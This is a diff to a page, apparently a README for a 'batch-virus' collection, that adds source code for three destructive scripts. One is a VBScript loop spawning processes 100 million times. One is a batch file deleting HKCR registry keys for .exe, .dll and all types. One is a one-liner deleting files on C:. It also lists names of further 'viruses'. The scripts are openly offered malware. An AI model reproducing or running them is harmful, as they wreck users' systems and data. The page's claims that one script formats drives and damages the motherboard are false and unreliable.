@@ -61,15 +61,61 @@ shutdown -r -f -t <span class="hljs-number">00</span>
   </details>
 
 
-virus3.bat
-Crash Ur Computer of Windows Xp
-virus30.bat
-overload with unlimited background processes
 
-virus4.bat
-Delete Key Registry Files [DANGEROUS]
-virus5.bat
-The Most Simple Virus To Crush The Window. Del C:
+3. Crash Ur Computer of Windows Xp
+
+
+<details><summary> Read More </summary>
+
+<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus3.bat">virus3.bat</a></p>
+<pre><code><span class="hljs-keyword">Option</span> <span class="hljs-keyword">Explicit</span>
+
+<span class="hljs-keyword">Dim</span> WSHShell
+<span class="hljs-keyword">Set</span> WSHShell=Wscript.<span class="hljs-built_in">CreateObject</span>(“Wscript.Shell”)
+
+<span class="hljs-keyword">Dim</span> x
+<span class="hljs-keyword">For</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">100000000</span>
+WSHShell.Run “Tourstart.exe”
+<span class="hljs-keyword">Next</span>
+</code></pre><p>This Virus works only for Windows XP, and besides formatting the drives, it damages the motherboard.</p>
+
+   
+
+  </details>
+
+4. Delete Key Registry Files 
+
+
+
+<details><summary> Read More </summary>
+ 
+ <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus4.bat">virus4.bat</a></p>
+<pre><code>@ECHO OFF
+START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.<span class="hljs-keyword">exe</span>
+START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.dll
+START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/*
+:MESSAGE
+ECHO Your computer <span class="hljs-built_in">has</span> been fcked. Have <span class="hljs-keyword">a</span> nice day.
+GOTO MESSAGE
+</code></pre><p>This virus is extremely dangerous, don&#39;t run it on your device.</p>
+
+  </details>
+
+5. The Most Simple Virus To Crush The Window. Delete C:/
+
+
+<details><summary> Read More </summary>
+ 
+ 
+<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus5.bat">virus5.bat</a></p>
+<pre><code>@Echo <span class="hljs-literal">off</span>
+Del C:<span class="hljs-string">\</span> *.* |y
+</code></pre><p>You device will not restart again, after it runs once!</p>
+
+ 
+  </details>
+ 
+ 
 virus6.bat
 Endless Notepads
 virus7.bat
@@ -122,6 +168,9 @@ virus28.bat
 Bloat randon folder
 virus29.bat
 User Account Bloatware
+virus30.bat
+overload with unlimited background processes
+
 virus31.bat
 Rabs killer and system crasher virus
 virus32.bat
